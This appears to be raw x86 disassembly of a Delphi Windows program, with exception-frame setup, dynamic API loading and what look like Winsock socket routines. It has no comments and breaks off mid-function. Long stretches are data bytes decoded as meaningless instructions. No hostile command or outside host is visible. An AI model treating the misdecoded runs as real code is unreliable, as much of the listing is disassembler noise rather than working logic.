add ch ch
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dh ch
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bh ch
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add al dl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add cl dl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dl dl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bl dl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ah dl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ch dl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dh dl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bh dl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add al bl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add cl bl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dl bl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bl bl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ah bl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ch bl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dh bl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bh bl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add al al
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add cl al
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dl al
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bl al
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ah al
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ch al
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dh al
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bh al
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add al cl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add cl cl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dl cl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bl cl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ah cl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add ch cl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add dh cl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add bh cl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ eax + 0x640000fe ] dh
xchg [ esi ] al
mov cl 0xfe
add [ eax ] al
xchg [ fs : esi ] al
mov dl 0xfe
add [ eax ] al
xchg [ fs : esi ] al
mov bl 0xfe
add [ eax ] al
xchg [ fs : esi ] al
mov ah 0xfe
add [ eax ] al
xchg [ fs : esi ] al
mov ch 0xfe
add [ eax ] al
xchg [ fs : esi ] al
mov dh 0xfe
add [ eax ] al
xchg [ fs : esi ] al
mov bh 0xfe
add [ eax ] al
xchg [ fs : esi ] al
mov eax 0x640000fe
xchg [ esi ] al
mov ecx 0x640000fe
xchg [ esi ] al
mov edx 0x640000fe
xchg [ esi ] al
mov ebx 0x640000fe
xchg [ esi ] al
mov esp 0x640000fe
xchg [ esi ] al
mov ebp 0x640000fe
xchg [ esi ] al
mov esi 0x640000fe
xchg [ esi ] al
mov edi 0x640000fe
xchg [ esi ] al
mov al [ 0x550000fe ]
mov ebp esp
xor eax eax
push ebp
push sub_455509
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455510
retn
sub_455594
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_455634
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebx + 0x14 ]
mov edx edi
call sub_403f00
mov [ ebx + 0xc ] esi
test esi esi
jne r-xdata
add esp 0xfffffff0
call sub_4033fc
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_40a9b8
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x10 ]
call sub_403f00
push edi
push r-xdata
push [ ebx + 0x10 ]
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_40422c
mov ecx [ ebp - 0xc ]
xor edx edx
mov eax ebx
call sub_40b1c0
mov ecx edi
xor edx edx
mov eax ebx
call sub_40b1c0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45563b
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403ed0
retn
sub_45563b
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_456418
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] edx
xor edx edx
push ebp
push sub_4564bb
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ eax + eax * 2 ]
lea ebx [ eax * 4 + rw-data ]
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov esi eax
mov eax [ ebx + 0x4 ]
mov [ eax ] esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4564c2
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403ed0
retn
push 0x276d
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_4059ac
mov eax [ ebp - 0x8 ]
mov edx [ ebx + 0x8 ]
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] 0x6
lea edx [ ebp - 0x10 ]
xor ecx ecx
call sub_408940
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_455594
call sub_403864
sub_4564cc
push ebx
xor eax eax
mov [ rw-data ] eax
mov ecx 0x70
mov eax rw-data
mov edx eax
mov ebx [ edx + 0x4 ]
mov edx [ edx ]
mov [ ebx ] edx
add eax 0xc
dec ecx
jne r-xdata
pop ebx
retn
sub_4564f0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4565bd
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
mov eax [ ebp + 0xc ]
push eax
mov ax [ ebp + 0x8 ]
push eax
call [ rw-data ]
mov ebx eax
jmp r-xdata
call GetLastError
push eax
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_4059ac
mov eax [ ebp - 0x8 ]
push eax
mov eax r-xdata
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x10 ]
xor ecx ecx
pop eax
call sub_408940
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_455594
call sub_403864
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4565c4
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403ed0
retn
sub_4565fb
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_456628
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45662f
retn
call sub_45566c
sub_456644
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_456669
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456670
retn
sub_45667c
enter 0x4566 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fsub [ esi + 0x45 ]
add [ eax + eax ] al
add [ eax ] al
mov al [ 0x20004010 ]
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ 0x53644954 ] cl
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add ah dl
outsd
inc ebp
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ eax ] ah
push 0x45
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add ah al
push 0x45
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ ecx + ebp ] ch
inc eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x80040 ] dl
imul esi [ ebx + 0x74 ] 0x6734c08b
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4567 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl cl
inc ebp
add [ eax ] dl
add [ eax ] al
add [ eax + 0x20004010 ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x6fd40040 ] ah
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebp * 2 + 0x45 ] bh
arpl [ ebx - 0x70 ] bp
and [ eax + 0x45 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
push 0xc0045
add [ eax ] al
fadd [ edi + 0x45 ]
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ 0x53644945 ] cl
je r-xdata
arpl [ ebp + 0x65 ] sp
push 0xffffffff
outsd
outsb
je r-xdata
arpl [ ebx + 0x45 ] bp
jb r-xdata
retn 0x4
arpl [ ebx + 0x53 ] bp
je r-xdata
je r-xdata
inc esi
popad
imul ebp [ ebp + 0x64 ] 0xe800408d
push 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
imul edi [ edx + 0x61 ] 0x6e6f6974
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ edi ] dl
inc ebp
dec ecx
push ebx
je r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
push 0xc0045
add [ eax ] al
aam 0x67
inc ebp
outsd
jb r-xdata
add [ eax ] al
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
lea ecx [ esp + 0x4 ]
call sub_45690c
retn
imul edi [ edx + 0x65 ] 0x65637845
push 0xffffffff
add [ eax ] al
or [ ecx + ecx * 2 + 0x64 ] dl
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
or [ eax ] al
sar [ eax + ebp * 2 + 0x45 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
add [ eax ] al
call 0xc45ae29
add [ eax ] al
add ah dl
inc ebp
add [ eax + eax ] cl
add [ eax ] al
aam 0x67
inc ebp
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ eax * 2 + 0x74536449 ] bl
popad
arpl [ ebx + 0x49 ] bp
outsb
imul esi [ ecx + ebp * 2 + 0x61 ] 0x617a696c
je r-xdata
inc ebp
sub_45690c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi eax
xor ebx ebx
inc edx
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0x6c ]
mov [ esi + 0x4 ] eax
mov edx [ ebp + 0x8 ]
test edx edx
jl r-xdata
mov edx [ esi + 0x4 ]
mov eax esi
call sub_4569c0
inc edx
mov eax edi
add eax 0x4
dec edx
jne r-xdata
mov bl 0x1
jmp r-xdata
mov ecx [ esi + 0x4 ]
cmp ecx [ eax ]
jne r-xdata
sub_456954
push ebp
mov ebp esp
push 0x0
push ebx
xor ebx ebx
push ebp
push sub_4569b3
push [ fs : ebx ]
mov [ fs : ebx ] esp
push ecx
mov ecx 0x2
xchg edx ecx
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4569ba
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
sub_4569c0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_456a12
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x68 ]
mov eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4551bc
call sub_403864
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456a19
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
sub_456a4c
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov edx r-xdata
mov eax ebx
call sub_407b44
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_456ef8
test al al
je r-xdata
mov eax edi
mov edx r-xdata
call sub_403f00
jmp r-xdata
mov ecx edi
mov edx ebx
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov eax edi
mov edx ebx
call sub_403f00
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_456ac4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov ebx ecx
mov esi edx
xor eax eax
push ebp
push sub_456ebe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403eac
mov eax esi
add eax 0xffffd8ec
cmp eax 0x3e
ja r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_4059ac
mov eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0x0
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
pop eax
call sub_408940
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_403f00
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456ec5
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403ed0
retn
jmp [ eax * 4 + jump_table_456b04 ]
mov edx ebx
mov eax [ rw-data ]
call sub_4059ac
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059ac
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059ac
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059ac
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059ac
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059ac
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059ac
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059ac
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059ac
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059ac
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059ac
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059ac
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059ac
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059ac
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059ac
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059ac
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059ac
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059ac
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059ac
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059ac
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059ac
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059ac
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059ac
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059ac
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059ac
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059ac
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059ac
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059ac
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059ac
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059ac
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059ac
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059ac
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059ac
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059ac
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059ac
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059ac
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059ac
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4059ac
sub_456ecc
push ebx
mov ebx eax
or edx 0xffffffff
mov eax ebx
call sub_407df4
inc eax
jle r-xdata
xor eax eax
pop ebx
retn
mov edx 0x100
mov eax ebx
call sub_407df4
cmp eax 0x100
jl r-xdata
mov al 0x1
pop ebx
retn
sub_456ef8
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
call sub_40435c
xor eax eax
push ebp
push sub_456fb7
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_458560
push 0x1
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_458560
push 0x1
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_458560
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_403f44
mov eax [ ebp - 0x8 ]
call sub_456ecc
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_456ecc
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456fbe
lea eax [ ebp - 0x14 ]
mov edx 0x5
call sub_403ed0
retn
mov eax [ ebp - 0x10 ]
call sub_456ecc
test al al
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_456ecc
test al al
jne r-xdata
mov bl 0x1
sub_456fd4
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_4030f0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030e0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_457004
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_40435c
xor eax eax
push ebp
push sub_45704c
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x80 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457053
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
sub_45705c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_457081
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457088
retn
sub_457094
loopne r-xdata
inc eax
add [ ecx + esi * 2 + 0x45 ] dl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
jo r-xdata
add [ eax ] dl
add [ eax ] al
add al ch
inc bp
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
jae r-xdata
add [ eax ] cl
add [ eax ] eax
add [ esi + 0x45 ] bh
add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add ah ch
jg r-xdata
in al dx
add [ eax ] ch
jns r-xdata
inc ebp
push edi
imul ebp [ esi + 0x64 ] 0x8d73776f
fdiv [ ecx + 0x45 ]
add [ edi + edi * 2 - 0x7fabffbb ] al
inc ebp
add al ch
jg r-xdata
push ebp
add [ eax + 0x77 ] ch
inc ebp
add [ eax - 0x63ffba88 ] al
push 0x80004577
js r-xdata
add al ch
jno r-xdata
mov [ eax + 0x794c0045 ] al
inc ebp
add [ eax + 0x38004575 ] cl
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x72ac0040 ] ah
inc ebp
and [ ebx ] dh
inc eax
add [ ebx + esi ] ch
add [ esp + edx * 2 ] dl
dec ecx
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
push ebp
add esp 0xfffffff0
call sub_4033fc
mov [ ebp - 0x194 ] ecx
test dl dl
je r-xdata
leave
add [ eax ] cl
jns r-xdata
xor ecx ecx
call [ ebx + 0x56 ]
add [ eax + edi * 2 + 0x79080045 ] bl
inc ebp
js r-xdata
cmp [ eax + 0x45 ] 0x0
pushfd
add [ ebx + esi * 2 + 0x74140045 ] al
inc ebp
add [ eax - 0x73ffba8c ] al
je r-xdata
jb r-xdata
add [ edi + edi * 2 + 0x45 ] ah
inc ebp
add ah al
jle r-xdata
and al 0x7e
add [ eax - 0x6fffba87 ] cl
jpe r-xdata
add [ eax - 0x5bffbfd0 ] cl
xor [ eax ] al
imul esi [ ebx + 0x74 ] 0x646e6957
outsd
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45728d
lea eax [ ebp - 0x194 ]
call sub_403eac
retn
lea eax [ ebp - 0x18e ]
push eax
push 0x202
call sub_4564f0
inc eax
jne r-xdata
add [ eax + 0x79 ] bl
inc ebp
add [ eax ] bl
jle r-xdata
add [ eax + 0x4c004580 ] cl
jns r-xdata
sbb [ esi + 0x45 ] bh
add ah bl
je r-xdata
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_456a20
cmp [ rw-data ] 0x0
jne r-xdata
add [ edi + edi * 8 + 0x30 ] ah
and [ ebx ] dh
ror [ ebx - 0x801173a ] cl
add [ edi * 2 + 0x540f0045 ] bh
jg r-xdata
add [ eax + 0x79 ] dh
inc ebp
add ah al
jne r-xdata
movsb [ edi ] [ esi ]
add [ eax + 0x5800457b ] dh
jl r-xdata
jne r-xdata
mov [ ebp + 0x45 ] dh
add [ eax ] bh
lea eax [ eax ]
push esp
jno r-xdata
mov [ rw-data ] 0x1
lea edx [ ebp - 0x194 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x194 ]
mov dl 0x1
push sub_457286
push [ fs : eax ]
fimul [ ebx + 0x55c033f0 ]
add [ esi + edi * 2 ] ah
xchg ebp eax
insb
mov ebp esp
add esp 0xfffffe6c
push ebx
push esi
arpl [ ebx + 0x57 ] bp
imul ebp [ esi + 0x64 ] 0x5573776f
push [ eax ]
add ah dl
jb r-xdata
dec ecx
push ebx
je r-xdata
cmp al 0x7d
inc ebp
add [ edi ] cl
push esp
jpo r-xdata
add [ ecx + edi * 2 + 0x45 ] bh
add [ eax - 0x5bffba85 ] bl
imul edx [ edi + 0x69 ] 0x6e
add al dl
jne r-xdata
lodsb [ esi ]
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
jno r-xdata
add al ch
pop edi
aas
sti
outsd
ja r-xdata
jne r-xdata
add ah ch
sub_4572ac
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_456fd4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_4572d4
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_457368
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov al [ ebx ]
lea edx [ ebp - 0x4 ]
call sub_407c7c
push [ ebp - 0x4 ]
push r-xdata
xor eax eax
mov al [ ebx + 0x1 ]
lea edx [ ebp - 0x8 ]
call sub_407c7c
push [ ebp - 0x8 ]
push r-xdata
xor eax eax
mov al [ ebx + 0x2 ]
lea edx [ ebp - 0xc ]
call sub_407c7c
push [ ebp - 0xc ]
push r-xdata
xor eax eax
mov al [ ebx + 0x3 ]
lea edx [ ebp - 0x10 ]
call sub_407c7c
push [ ebp - 0x10 ]
